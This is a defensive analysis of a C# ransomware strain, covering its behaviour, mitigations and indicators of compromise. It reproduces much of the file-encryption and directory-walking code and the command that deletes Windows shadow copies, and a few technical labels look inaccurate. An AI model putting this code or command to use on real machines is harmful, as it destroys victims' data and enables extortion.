
# 🔐 Analysis of ZagreuS Ransomware (C#)

## Introduction

This analysis focuses on a ransomware sample named **ZagreuS**, written in **C#**, targeting **Windows systems**. The malware is a fully functional ransomware strain designed to **encrypt user data**, demand a **Bitcoin ransom**, and notify its operators through a **Discord webhook**. It utilizes **AES (Rijndael)** and **RSA** cryptographic techniques and targets a **large number of file extensions**.

- **Language**: C#
- **Encryption**: AES (RijndaelManaged), RSA (Public Key)
- **Persistence**: System registry manipulation
- **Notification**: Discord webhook
- **Communication**: None interactive; static Bitcoin address and email contact

## 🧠 General Behavior

Upon execution, the ransomware performs the following sequence:

1. **Enables UAC** by editing the registry.
2. **Deletes shadow copies** to prevent file recovery.
3. **Encrypts files** across various directories and potentially all logical drives.
4. **Leaves a ransom note** in each encrypted directory.
5. **Sends notification** via a hardcoded Discord webhook.

## 🔬 Technical Analysis

### Function: `Main()`
```csharp
[STAThread]
public static void Main()
{
    EnableUAC();                  // Enable UAC via registry
    DeleteShadowCopies();         // Delete Volume Shadow Copies
    EncryptFiles();               // Encrypt target files
    DeleteShadowCopies();         // Ensure shadow copies are gone
    NotifyViaDiscord();           // Alert attackers
}
```

### Function: `EncryptFiles()`
```csharp
public static void EncryptFiles()
{
    encryptedKey = Convert.ToBase64String(EncryptRSA(contactEmail, GenerateRandomString(30)));

    if (encryptLogicalDrives == "True")
    {
        foreach (string drive in Directory.GetLogicalDrives())
        {
            if (drive != "C:\")
            {
                EncryptDirectory(drive, randomString);
                CreateRansomNote(drive);
            }
        }
    }

    if (encryptDesktop == "True")
    {
        EncryptDirectory(desktopPath, randomString);
        CreateRansomNote(desktopPath);
    }
}
```

### Function: `EncryptAES(byte[] data, byte[] key)`
```csharp
public static byte[] EncryptAES(byte[] data, byte[] key)
{
    using (var aes = new RijndaelManaged())
    {
        aes.KeySize = keySize;
        aes.BlockSize = blockSize;
        var derive = new Rfc2898DeriveBytes(key, passwordSalt, keyDerivationIterations);
        aes.Key = derive.GetBytes(keySize / byteSize);
        aes.IV = derive.GetBytes(blockSize / byteSize);
        aes.Mode = CipherMode.CBC;

        using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cs.Write(data, 0, data.Length);
        }
        return ms.ToArray();
    }
}
```

### Function: `EncryptFile()`
```csharp
public static void EncryptFile(string filePath, string key)
{
    byte[] fileData = File.ReadAllBytes(filePath);
    byte[] keyBytes = Encoding.UTF8.GetBytes(key);
    keyBytes = SHA256.Create().ComputeHash(keyBytes);
    byte[] encryptedData = EncryptAES(fileData, keyBytes);
    File.WriteAllBytes(filePath, encryptedData);
    File.Move(filePath, filePath + encryptedExtension);
}
```

### Function: `EncryptDirectory()`
```csharp
public static void EncryptDirectory(string path, string key)
{
    string[] files = Directory.GetFiles(path);
    string[] directories = Directory.GetDirectories(path);

    foreach (string file in files)
    {
        string extension = Path.GetExtension(file);
        if (targetExtensions.Contains(extension))
        {
            EncryptFile(file, key);
        }
    }

    foreach (string dir in directories)
    {
        EncryptDirectory(dir, key);
        CreateRansomNote(dir);
    }
}
```

### Function: `EnableUAC()`
```csharp
var processInfo = new ProcessStartInfo("cmd.exe")
{
    Arguments = "reg.exe ADD HKLM\...\EnableLUA /t REG_DWORD /d 1 /f",
    Verb = "runas"
};
```

### Function: `DeleteShadowCopies()`
```csharp
ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet")
```

### Function: `NotifyViaDiscord()`
```csharp
Process.Start(discordWebhook);
```

### Function: `CreateRansomNote()`
```csharp
File.WriteAllLines(Path.Combine(path, "HELP_DECRYPT_YOUR_FILES.txt"), ransomNote);
```

## 🧪 Techniques Used

### 🧷 Persistence
```csharp
EnableUAC();
```

### 🎭 Obfuscation
- None apparent beyond typical string generation and variable naming.

### 📤 Exfiltration / Notification
```csharp
public static string discordWebhook = "...";
```

### 🔒 Encryption
- Hybrid AES-RSA encryption using strong cryptographic practices.

## ✅ Conclusion

ZagreuS ransomware is a mid-level threat ransomware strain:
- It targets a wide array of files.
- Uses a decent cryptographic approach.
- The implementation of Discord notification is ineffective.

🛡️ Mitigation:
- Monitor usage of vssadmin and registry manipulation.
- Disable macro/script execution.
- Backup files regularly and store them offline.

## 📄 Indicators of Compromise (IOCs)

- **Filename Dropped**: `HELP_DECRYPT_YOUR_FILES.txt`
- **Extensions Used**: `.RDPLOCKED`
- **Registry Key**:
  - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`
- **Discord Webhook**:
  - `https://discord.com/api/webhooks/1327963875894759434/IqV04atSt4...`
- **Contact Email**: `rlocked@protonmail.com`
- **Bitcoin Wallet**: `js97xc025fwviwhdg53gla97xc025fwv`
